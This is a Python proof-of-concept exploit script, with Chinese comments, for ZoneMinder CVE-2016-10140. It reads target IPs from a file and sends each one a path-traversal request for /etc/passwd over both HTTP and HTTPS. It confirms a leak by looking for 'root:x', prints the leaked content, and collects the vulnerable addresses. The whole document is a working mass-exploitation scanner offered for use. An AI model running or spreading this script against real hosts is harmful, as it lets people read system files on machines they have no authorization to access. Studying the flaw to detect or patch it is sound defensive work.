# Zoneminder 未授权访问 （CVE-2016-10140）
import urllib.request


def poc(url):
    plugin_list = [
        '/?view=file&path=/../../../../../etc/passwd',
    ]
    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
    for plugin_path in plugin_list:
        paylaod = url + plugin_path
        re = urllib.request.Request(url=paylaod, headers=headers)
        res = urllib.request.urlopen(re, timeout=3)
        code = res.getcode()
        context = res.read()

        if "root:x" in context.decode('utf-8') and code == 200:
            print("发现漏洞可以利用：")
            print("payload：" + paylaod)
            print("回显：" + context.decode('utf-8')[:32])
            v_ip.append(url)


if __name__ == '__main__':
    global v_ip
    v_ip = []
    with open("ip.txt", "r", encoding="utf-8") as f:
        iplib = f.readlines()
    for ip in iplib:
        try:
            url = "http://{}".format(ip.replace("\n", ""))
            print(url)
            poc(url)
        except Exception as e:
            pass
        try:
            url = "https://{}".format(ip.replace("\n", ""))
            print(url)
            poc(url)
        except Exception as e:
            pass

    print("有漏洞的IP如下：")
    print(set(v_ip))
